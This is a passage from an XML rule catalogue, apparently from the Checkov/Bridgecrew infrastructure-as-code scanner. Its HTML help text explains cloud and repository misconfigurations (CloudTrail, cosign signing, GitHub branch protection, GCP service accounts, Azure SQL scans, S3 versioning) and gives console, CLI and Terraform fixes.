      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudtrail-logging-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-trail-logging-is-disabled"></div>AWS CloudTrail logging is disabled</div><a aria-label="Skip link to AWS CloudTrail logging is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudtrail-logging-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-logging-is-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-logging-is-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-cloudtrail-logging-is-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GHA_5</key>
    <name>Ensure GitHub Actions artifact build has cosign - sign execution in pipeline</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-actions-artifact-build-do-not-have-cosign---sign-execution-in-pipeline"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-actions-artifact-build-do-not-have-cosign-sign-execution-in-pipeline"></div>GitHub Actions artifact build do not have cosign - sign execution in pipeline</div><a aria-label="Skip link to GitHub Actions artifact build do not have cosign - sign execution in pipeline" class="heading-anchor-icon fa fa-anchor" href="#github-actions-artifact-build-do-not-have-cosign---sign-execution-in-pipeline"></a></h1>
<p>Cosign can be used to sign pipeline artifacts, such as container images, to ensure their integrity and prevent tampering prior to and after deployment. Violating this policy means a signable artifact was discovered but there is no evidence of signing that artifact in your pipeline.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="example-fix"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-example-fix"></div>Example Fix</div><a aria-label="Skip link to Example Fix" class="heading-anchor-icon fa fa-anchor" href="#example-fix"></a></h1>
<p>Add <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">cosign sign</code> to sign artifacts. There are many ways to do this as a job or step in a GitHub Actions pipeline. Below is one example for signing a container image.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">+ run: cosign sign --key env://COSIGN_PRIVATE_KEY -a sha=${{ github.sha }} -a run_id=${{ github.run_id }} ${{ env.IMAGE }}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/no-evidence-of-signing' target='_blank'> https://docs.bridgecrew.io/docs/no-evidence-of-signing</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/no-evidence-of-signing' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_6</key>
    <name>Ensure GitHub organization webhooks use HTTPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-organization-webhooks-do-not-use-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-organization-webhooks-do-not-use-htt-ps"></div>GitHub organization webhooks do not use HTTPs</div><a aria-label="Skip link to GitHub organization webhooks do not use HTTPs" class="heading-anchor-icon fa fa-anchor" href="#github-organization-webhooks-do-not-use-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Webhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-organization-webhooks-are-using-https' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-organization-webhooks-are-using-https</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-organization-webhooks-are-using-https' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_8</key>
    <name>Ensure GitHub branch protection rules requires linear history</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-branch-protection-rules-do-not-require-linear-history"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-branch-protection-rules-do-not-require-linear-history"></div>GitHub branch protection rules do not require linear history</div><a aria-label="Skip link to GitHub branch protection rules do not require linear history" class="heading-anchor-icon fa fa-anchor" href="#github-branch-protection-rules-do-not-require-linear-history"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Ensure your team uses strictly linear history with squash merges and rebase merge to make development easier. If your organization allows squash merge or rebase merge, then you can <a href="https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/defining-the-mergeability-of-pull-requests/about-protected-branches#require-linear-history" target="_self">enable linear history</a> from the branch protection menu.</p>
<span aria-label="1111" class="img" role="button" tabindex="0"><img align="" alt="1111" caption="" class="" height="auto" loading="lazy" src="https://files.readme.io/caefc3a-Screen_Shot_2022-08-19_at_5.14.45_PM.png" title="Screen Shot 2022-08-19 at 5.14.45 PM.png" width="auto"/><span autofocus="" class="lightbox" role="dialog" tabindex="0"><span class="lightbox-inner"><img align="" alt="1111" caption="" class="lightbox-img" height="auto" loading="lazy" src="https://files.readme.io/caefc3a-Screen_Shot_2022-08-19_at_5.14.45_PM.png" title="Click to close..." width="auto"/></span></span></span> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-linear-history' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-linear-history</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-linear-history' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_9</key>
    <name>Ensure the GitHub repository has at least 2 admins set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-repository-has-less-than-2-admins"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-repository-has-less-than-2-admins"></div>GitHub repository has less than 2 admins</div><a aria-label="Skip link to GitHub repository has less than 2 admins" class="heading-anchor-icon fa fa-anchor" href="#github-repository-has-less-than-2-admins"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Having two or more admins allows for failover if an admin is busy and for checks between admins. Ensure you have at least two admins for every repository.</p> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-2-admins-are-set-for-each-repository' target='_blank'> https://docs.bridgecrew.io/docs/ensure-2-admins-are-set-for-each-repository</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-2-admins-are-set-for-each-repository' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GITHUB_10</key>
    <name>Ensure GitHub branch protection rules are enforced on administrators</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-branch-protection-rules-are-not-enforced-on-administrators"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-branch-protection-rules-are-not-enforced-on-administrators"></div>GitHub branch protection rules are not enforced on administrators</div><a aria-label="Skip link to GitHub branch protection rules are not enforced on administrators" class="heading-anchor-icon fa fa-anchor" href="#github-branch-protection-rules-are-not-enforced-on-administrators"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>By default, branch protection rules do not apply to admins. This allows admins to bypass many of the safeguards put in place and thus makes them and their accounts a higher liability. Enforce branch protection rules for admins to ensure safeguards are in place for all users.</p>
<span aria-label="1106" class="img" role="button" tabindex="0"><img align="" alt="1106" caption="" class="" height="auto" loading="lazy" src="https://files.readme.io/a07f1a0-Screen_Shot_2022-08-19_at_5.13.12_PM.png" title="Screen Shot 2022-08-19 at 5.13.12 PM.png" width="auto"/><span autofocus="" class="lightbox" role="dialog" tabindex="0"><span class="lightbox-inner"><img align="" alt="1106" caption="" class="lightbox-img" height="auto" loading="lazy" src="https://files.readme.io/a07f1a0-Screen_Shot_2022-08-19_at_5.13.12_PM.png" title="Click to close..." width="auto"/></span></span></span> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-branch-protection-rules-are-enforced-on-administrators' target='_blank'> https://docs.bridgecrew.io/docs/ensure-branch-protection-rules-are-enforced-on-administrators</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-branch-protection-rules-are-enforced-on-administrators' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_BITBUCKET_1</key>
    <name>Ensure BitBucket pull requests require at least 2 approvals</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="bitbucket-pull-requests-require-less-than-approvals"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-bit-bucket-pull-requests-require-less-than-approvals"></div>BitBucket pull requests require less than approvals</div><a aria-label="Skip link to BitBucket pull requests require less than approvals" class="heading-anchor-icon fa fa-anchor" href="#bitbucket-pull-requests-require-less-than-approvals"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In Bitbucket, repository administrators can require that all pull requests receive a specific number of approving reviews before someone merges the pull request into a protected branch.</p>
<p>If a collaborator attempts to merge a pull request with pending or rejected reviews into the protected branch, the collaborator will receive an error message.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<ol>
<li>Login to Bitbucket</li>
<li>Select your repository</li>
<li>Select Repository settings</li>
<li>Select Branch restrictions</li>
<li>Add a restriction</li>
<li>Under Merge settings check Minimum number of approvals and select 2</li>
<li>Save</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals-1' target='_blank'> https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals-1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/merge-requests-should-require-at-least-2-approvals-1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_30</key>
    <name>Ensure instances do not use default Compute Engine service account</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="instances-use-default-compute-engine-service-account"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-instances-use-default-compute-engine-service-account"></div>Instances use default Compute Engine service account</div><a aria-label="Skip link to Instances use default Compute Engine service account" class="heading-anchor-icon fa fa-anchor" href="#instances-use-default-compute-engine-service-account"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The default Compute Engine service account has Editor role on the project, allowing read and write access to most Google Cloud Services. </p>
<p>We recommend you configure your instance to not use the default Compute Engine service account.<br/>
You should create a new service account and assign only the permissions needed by your instance. This helps defend against compromised VM privilege escalations and prevent an attacker from gaining access to all of your project. </p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>The default Compute Engine service account is named:<br/>
<em>[PROJECT_NUMBER]<a class="__cf_email__" data-cfemail="5f723c30322f2a2b3a1f3b3a293a33302f3a2d71382c3a2d29363c3a3e3c3c302a312b713c3032" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a></em>.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/compute/instances" target="_self">VM instances</a>.</li>
<li>Click on the instance name to go to its <strong>VM instance details</strong> page.</li>
<li>Click <strong>STOP</strong>, then click <strong>EDIT</strong>.</li>
<li>Under the section <strong>Service Account</strong>, select a service account. You may first need to create a new service account.</li>
</ol>
<blockquote class="callout callout_warn" theme="&#128679;"><h3 class="callout-heading"><span class="callout-icon">&#128679;</span><p>Warning</p></h3><p>Do not select the default Compute Engine service account.</p></blockquote>
<ol start="5">
<li>Click <strong>Save</strong> and then click <strong>START</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>Stop the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances stop INSTANCE_NAME
</code></pre>
<ol start="2">
<li>Update the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances set-service-account INSTANCE_NAME -
-serviceaccount=SERVICE_ACCOUNT
</code></pre>
<ol start="3">
<li>Restart the instance:</li>
</ol>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud compute instances start INSTANCE_NAME
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_compute_instance</li>
<li><strong>Field</strong>: service_account</li>
<li><strong>Argument</strong>: email = &lt;email other than the default service_account's&gt;</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_compute_instance" "default" {
  name         = "test"
  machine_type = "n1-standard-1"
  zone         = "us-central1-a"
+  service_account {
    scopes = ["userinfo-email", "compute-ro", "storage-ro"]
-    email  = "[PROJECT_NUMBER]<a class="__cf_email__" data-cfemail="3d105e52504d4849587d59584b5851524d584f135a4e584f4b545e585c5e5e52485349135e5250" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
+    email  = "<a class="__cf_email__" data-cfemail="513429303c213d3411343c30383d7f323e3c" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_iam_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_iam_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_3</key>
    <name>Ensure Azure SQL server ADS Vulnerability Assessment Periodic recurring scans is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-ads-vulnerability-assessment-periodic-recurring-scans-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-ads-vulnerability-assessment-periodic-recurring-scans-is-disabled"></div>Azure SQL server ADS Vulnerability Assessment Periodic recurring scans is disabled</div><a aria-label="Skip link to Azure SQL server ADS Vulnerability Assessment Periodic recurring scans is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-ads-vulnerability-assessment-periodic-recurring-scans-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Vulnerability Assessment (VA) Periodic recurring scans for critical SQL servers and corresponding SQL databases.<br/>
VA setting 'Periodic recurring scans' schedules periodic (weekly) vulnerability scanning for the SQL server and corresponding Databases. Periodic and regular vulnerability scanning provides risk visibility based on updated known vulnerability signatures and best practices.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_sql_server,  azurerm_storage_account, azurerm_storage_container,  azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "okExample" {
  name     = "okExample-resources"
  location = "West Europe"
}

resource "azurerm_sql_server" "okExample" {
  name                         = "mysqlserver"
  resource_group_name          = azurerm_resource_group.okExample.name
  location                     = azurerm_resource_group.okExample.location
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}

resource "azurerm_storage_account" "okExample" {
  name                     = "accteststorageaccount"
  resource_group_name      = azurerm_resource_group.okExample.name
  location                 = azurerm_resource_group.okExample.location
  account_tier             = "Standard"
  account_replication_type = "GRS"
}

resource "azurerm_storage_container" "okExample" {
  name                  = "accteststoragecontainer"
  storage_account_name  = azurerm_storage_account.okExample.name
  container_access_type = "private"
}

resource "azurerm_mssql_server_security_alert_policy" "okExample" {
  resource_group_name = azurerm_resource_group.okExample.name
  server_name         = azurerm_sql_server.okExample.name
  state               = "Enabled"
}

resource "azurerm_mssql_server_vulnerability_assessment" "okExample" {
  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id
  storage_container_path          = "${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/"
  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key

  recurring_scans {
    enabled                   = true
    email_subscription_admins = true
    emails = [
      "<a class="__cf_email__" data-cfemail="0d68606c64614d68756c607d61683c236e6260" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="b7d2dad6dedbf7d2cfd6dac7dbd28599d4d8da" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
    ]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-periodic-recurring-scans-is-enabled-on-a-sql-server' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-va-setting-periodic-recurring-scans-is-enabled-on-a-sql-server</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-periodic-recurring-scans-is-enabled-on-a-sql-server' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_21</key>
    <name>Ensure AWS S3 object versioning is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-s3-object-versioning-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-s-3-object-versioning-is-disabled"></div>AWS S3 object versioning is disabled</div><a aria-label="Skip link to AWS S3 object versioning is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-s3-object-versioning-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>S3 versioning is a managed data backup and recovery service provided by AWS. When enabled it allows users to retrieve and restore previous versions of their buckets. </p>
<p>S3 versioning can be used for data protection and retention scenarios such as recovering objects that have been accidentally/intentionally deleted or overwritten.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/s3/" target="_self">Amazon S3 console</a>.</li>
<li>Select the bucket that you want to configure. </li>
<li>Select the <strong>Properties</strong> tab.</li>
<li>Navigate to the <strong>Permissions</strong> section.</li>
<li>Select <strong>Edit bucket policy</strong>. If the selected bucket does not have an <em>access policy</em>, click <strong>Add bucket policy</strong>.</li>
<li>Select the <strong>Versioning</strong> tab from the <strong>Properties</strong> panel, and expand the <strong>feature configuration</strong> section. </li>
<li>To activate object versioning for the selected bucket, click <strong>Enable Versioning</strong>, then click <strong>OK</strong>. The <strong>feature status</strong> should change to <strong>versioning is currently enabled on this bucket</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Resource: aws_s3_bucket<br/>
Attribute: version/enabled</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.state_bucket.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.state_bucket.tf">resource "aws_s3_bucket" "state_bucket" {
  bucket        = "${data.aws_caller_identity.current.account_id}-terraform-state"
  acl           = var.acl
  force_destroy = var.force_destroy

+  versioning {
+    enabled    = true
+  }

  server_side_encryption_configuration {
    rule {
      apply_server_side_encryption_by_default {
        sse_algorithm = var.sse_algorithm
      }
    }
  }

  tags = var.common_tags
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/s3_16-enable-versioning' target='_blank'> https://docs.bridgecrew.io/docs/s3_16-enable-versioning</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/s3_16-enable-versioning' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_31</key>
    <name>Ensure instances do not use default service account with full access to cloud APIs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="instances-use-default-service-account-with-full-access-to-cloud-apis"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-instances-use-default-service-account-with-full-access-to-cloud-ap-is"></div>Instances use default service account with full access to cloud APIs</div><a aria-label="Skip link to Instances use default service account with full access to cloud APIs" class="heading-anchor-icon fa fa-anchor" href="#instances-use-default-service-account-with-full-access-to-cloud-apis"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When an instance is configured with <strong>Compute Engine default service account</strong> with Scope <strong>Allow full access to all Cloud APIs</strong>, based on IAM roles assigned to the user(s) accessing Instance, it may result in privilege escalation. For example, a user may have permission to perform cloud operations and API calls that they are not required to perform.</p>
<p>Along with the ability to optionally create, manage and use user managed custom service accounts, Google Compute Engine provides default service account <strong>Compute Engine default service account</strong> for an instances to access necessary cloud services. <strong>Project Editor</strong> role is assigned to <strong>Compute Engine default service account</strong> for this service account to have almost all capabilities over all cloud services, except billing. When <strong>Compute Engine default service account</strong> is assigned to an instance it can operate in three scopes:</p>
<ol>
<li><strong>Allow default access</strong>: Allows only minimum access required to run an Instance (Least Privileges).</li>
<li><strong>Allow full access to all Cloud APIs</strong>: Allows full access to all the cloud APIs/Services (too much access).</li>
<li><strong>Set access for each API</strong>: Allows Instance administrator to choose only those APIs that are needed to perform specific business functionality expected by instance.</li>
</ol>
<p>We recommend you do not assign instances to default service account <strong>Compute Engine<br/>
default service account</strong> with Scope <strong>Allow full access to all Cloud APIs</strong>. This supports the principle of least privileges and helps prevent potential privilege escalation, </p>
